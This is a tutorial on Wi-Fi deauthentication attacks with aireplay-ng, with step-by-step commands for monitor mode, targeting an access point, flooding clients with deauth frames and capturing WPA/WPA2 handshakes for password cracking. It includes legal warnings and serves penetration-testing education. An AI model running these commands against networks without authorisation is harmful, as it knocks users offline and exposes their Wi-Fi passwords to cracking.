Deauthentication Attack Using aireplay-ng

aireplay-ng is a tool from the Aircrack-ng suite used for injecting packets into a wireless network. One of its popular features is sending Deauthentication packets to disconnect devices from a Wi-Fi network. Ethical hackers use this to capture handshakes or test Wi-Fi robustness.

What is a Deauthentication Attack?

A Deauthentication Attack is a type of wireless network attack where the attacker sends deauthentication frames to Wi-Fi clients, forcing them to disconnect from the access point.

In Wi-Fi protocols, deauthentication is a legitimate feature that allows a network administrator to disconnect a device intentionally. However, attackers can exploit this feature to repeatedly disconnect clients and capture WPA/WPA2 handshake packets during their reconnection attempts.

Why is it Used?

  • Ethical Hacking: To test network security and resilience.
  • Penetration Testing: To capture handshake packets for WPA/WPA2 password testing.
  • Network Troubleshooting: To temporarily disconnect rogue or suspicious devices.

Important: Performing this attack without permission is illegal in most countries.

Legal Warning

Only use these tools in environments you own or have written permission to test. Unauthorized use of Wi-Fi hacking tools is illegal and unethical.

Prerequisites

  • Kali Linux or similar OS with Aircrack-ng installed
  • Wi-Fi adapter that supports monitor mode and packet injection
  • Root (sudo) access

Step-by-Step: Deauth Attack with aireplay-ng

Step 1: Enable Monitor Mode

sudo airmon-ng start wlan0

Explanation: This puts your Wi-Fi adapter into monitor mode, which is needed for sending/receiving raw 802.11 packets.

After running this, your interface name may change to wlan0mon.

Step 2: Scan for Nearby Wi-Fi Networks

sudo airodump-ng wlan0mon

Explanation: Shows all nearby access points (APs) and clients connected to them.

  • Note the BSSID (MAC address of the router)
  • Note the Channel (CH)

Once you have the details, press CTRL + C to exit this scan.

Step 3: Focus on Target Access Point

sudo airodump-ng --bssid [Router-BSSID] -c [Channel] wlan0mon

Explanation: Monitors only the selected router and shows connected clients.

  • Replace [Router-BSSID] with the actual MAC address
  • Replace [Channel] with the actual channel number

Important: Keep this terminal running if you want to capture the WPA/WPA2 handshake.

Step 4: Run aireplay-ng in a Separate Terminal

While airodump-ng is running in one terminal, open a new terminal window or tab and run:

sudo aireplay-ng --deauth 100 -a [Router-BSSID] -c [Client-MAC] wlan0mon

Explanation of Flags:

  • --deauth 100 – Send 100 deauthentication packets.
  • --deauth 0 – Send deauthentication packets continuously (infinite) until you manually stop with CTRL + C. Warning: This is more disruptive and should only be used in a controlled lab environment.
  • -a – The router's MAC address (BSSID).
  • -c – The client’s MAC address (optional). If omitted, all clients will be disconnected.
  • wlan0mon – Your interface in monitor mode.

Example Commands:

# Send 50 packets to a single client
sudo aireplay-ng --deauth 50 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

# Send infinite packets until stopped manually
sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon

Capturing WPA/WPA2 Handshake

Once you start a deauthentication attack, clients will try to reconnect to the Wi-Fi. If you are running airodump-ng at the same time, you can capture the WPA/WPA2 handshake.

Step 1: Start Capturing

sudo airodump-ng --bssid 00:11:22:33:44:55 -c [Channel] -w handshake wlan0mon
  • --bssid – Target router's MAC address
  • -c – Channel number
  • -w – File name to save capture (e.g., handshake.cap)

Step 2: Trigger Reconnection

In another terminal, run your deauth command (including --deauth 0 if you want continuous packets) to make clients reconnect.

Step 3: Check for Handshake

Look at the top right of the airodump-ng window for:

[ WPA handshake: 00:11:22:33:44:55 ]

Stopping Monitor Mode

sudo airmon-ng stop wlan0mon
